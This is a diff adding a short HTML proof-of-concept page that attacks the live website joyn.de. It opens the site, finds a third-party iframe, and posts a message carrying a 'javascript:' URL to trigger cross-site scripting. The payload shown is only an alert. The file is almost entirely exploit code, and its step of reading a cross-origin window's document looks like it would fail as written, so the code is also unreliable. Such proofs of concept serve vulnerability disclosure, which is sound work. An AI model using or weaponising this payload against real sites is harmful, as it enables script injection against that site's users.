@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS PoC for joyn.de</title>
+</head>
+<body>
+    <h1>Click to Exploit XSS on joyn.de</h1>
+    <button onclick="triggerExploit()">Exploit</button>
+
+    <script>
+        function triggerExploit() {
+         
+            const targetWindow = window.open('https://www.joyn.de/', '_blank');
+
+         
+            setTimeout(() => {
+               
+                const vulnerableIframe = Array.from(targetWindow.document.querySelectorAll('iframe'))
+                    .find(iframe => iframe.src.includes('cdn-gl.nmrodam.com/novms/html/ls.html'));
+
+                if (vulnerableIframe) {
+                    console.log('Vulnerable iframe found:', vulnerableIframe.src);
+                    
+                 
+                    const payload = JSON.stringify({
+                        nolSentFromBsdk: true,
+                        eventType: "requsingframe",
+                        data: {
+                            url: "javascript:alert('syyc_')"
+                        }
+                    });
+                    vulnerableIframe.contentWindow.postMessage(payload, '*');
+                    alert('Exploit sent! Check the joyn.de window for the XSS alert.');
+                } else {
+                    console.log('No vulnerable iframe found.');
+                    alert('No vulnerable iframe found on joyn.de.');
+                }
+            }, 3000); 
+        }
+    </script>
+</body>
+</html>
